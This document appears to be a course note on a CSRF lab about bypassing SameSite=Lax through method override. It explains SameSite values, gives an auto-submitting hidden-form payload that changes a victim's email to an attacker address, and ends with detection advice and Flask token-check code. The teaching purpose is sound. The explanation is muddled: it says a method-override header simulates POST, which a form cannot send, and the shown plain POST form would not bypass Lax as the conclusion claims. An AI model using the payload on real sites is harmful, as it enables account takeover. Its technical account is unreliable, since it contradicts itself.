---
course: Web Security
topic: Cross-Site Request Forgery (CSRF)
tags: [web-security]
---

## Understanding SameSite Attribute

The `SameSite` attribute is a security feature introduced to mitigate CSRF attacks. It controls whether cookies are sent with cross-site requests. There are three values for the `SameSite` attribute: `Strict`, `Lax`, and `None`.

### SameSite=Strict

When `SameSite` is set to `Strict`, cookies are only sent with requests originating from the same site. This provides strong protection against CSRF but can break some legitimate uses of cross-site requests.

### SameSite=Lax

When `SameSite` is set to `Lax`, cookies are sent with top-level navigations but not with subresource requests. This provides a balance between security and usability.

### SameSite=None; Secure

When `SameSite` is set to `None`, cookies are sent with all requests, including cross-site requests. However, this requires the `Secure` flag to ensure that cookies are only sent over HTTPS.

### Method Override

Method override is a technique used to simulate HTTP methods like PUT and DELETE using POST requests. This is often necessary because older browsers do not support these methods natively.

#### Example of Method Override

```http
POST /api/resource HTTP/1.1
Host: example.com
X-HTTP-Method-Override: PUT
Content-Type: application/json

{
  "id": 1,
  "name": "New Name"
}
```

In this example, the `X-HTTP-Method-Override` header is used to indicate that the actual method being simulated is `PUT`.

### Lab Environment

The lab environment consists of a web application with a change email function that is vulnerable to CSRF. The `SameSite` attribute is set to `Lax`, which means that cookies are sent with top-level navigations but not with subresource requests.

#### Vulnerable Function

The change email function is accessible via a POST request to `/change-email`. The request includes the new email address and the CSRF token.

### Crafting the Exploit

To perform the CSRF attack, we need to craft a malicious request that changes the victim's email address. We will use the provided exploit server to host our attack.

#### Step-by-Step Process

1. **Identify the Vulnerable Endpoint**:
   - The endpoint for changing the email is `/change-email`.
   - The request includes the new email address and the CSRF token.

2. **Craft the Malicious Request**:
   - We need to craft a POST request to `/change-email` with the new email address.
   - We will use the `X-HTTP-Method-Override` header to simulate a POST request.

3. **Host the Exploit**:
   - Use the provided exploit server to host the malicious HTML page.

#### Code Example

Here is the complete HTML page that hosts the malicious request:

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>CSRF Exploit</h1>
    <form id="csrf-form" action="https://example.com/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@example.com">
        <input type="hidden" name="csrf_token" value="...">
    </form>
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

### Explanation of the Code

- **Form Submission**: The form is submitted automatically using JavaScript.
- **Hidden Inputs**: The form includes hidden inputs for the new email address and the CSRF token.
- **Action URL**: The form's action URL points to the vulnerable endpoint.

### Executing the Attack

To execute the attack, the victim needs to visit the malicious HTML page hosted on the exploit server. When the page loads, the form is submitted automatically, changing the victim's email address.

### Detection and Prevention

#### Detection

To detect CSRF attacks, web applications can monitor for unusual patterns of requests. For example, if a user is not actively interacting with the application but requests are still being made, this could indicate a CSRF attack.

#### Prevention

To prevent CSRF attacks, web applications should implement the following measures:

1. **Use CSRF Tokens**: Generate unique tokens for each session and validate them on the server-side.
2. **Set SameSite Attribute**: Set the `SameSite` attribute to `Lax` or `Strict` to control cookie behavior.
3. **Use Content Security Policy (CSP)**: Implement CSP to restrict the sources of content that can be loaded.

#### Secure Coding Practices

Here is an example of how to implement CSRF protection in a web application:

```python
from flask import Flask, request, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'your_secret_key'

@app.route('/login', methods=['POST'])
def login():
    # Perform login logic
    session['csrf_token'] = generate_csrf_token()
    return redirect(url_for('home'))

@app.route('/change-email', methods=['POST'])
def change_email():
    if request.form.get('csrf_token') != session.get('csrf_token'):
        return "Invalid CSRF token", 403
    # Change email logic
    return "Email changed successfully"

def generate_csrf_token():
    import os
    return os.urandom(16).hex()

if __name__ == '__main__':
    app.run(debug=True)
```

### Explanation of the Secure Code

- **Session Management**: The CSRF token is stored in the session.
- **Token Validation**: The token is validated on the server-side before performing any actions.
- **Token Generation**: A unique token is generated for each session.

### Conclusion

In this lab, we covered the basics of Cross-Site Request Forgery (CSRF) and how to perform a CSRF attack that bypasses the `SameSite` attribute set to `Lax`. We also discussed the importance of implementing proper CSRF protection measures to prevent such attacks.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs related to CSRF and other web security topics.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application for learning web security.

By completing these labs, you will gain practical experience in identifying and preventing CSRF attacks.

---
<!-- nav -->
[[03-SameSite Lax Configuration|SameSite Lax Configuration]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/10-Lab 9 SameSite Lax bypass via method override/00-Overview|Overview]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/10-Lab 9 SameSite Lax bypass via method override/05-Practice Questions & Answers|Practice Questions & Answers]]
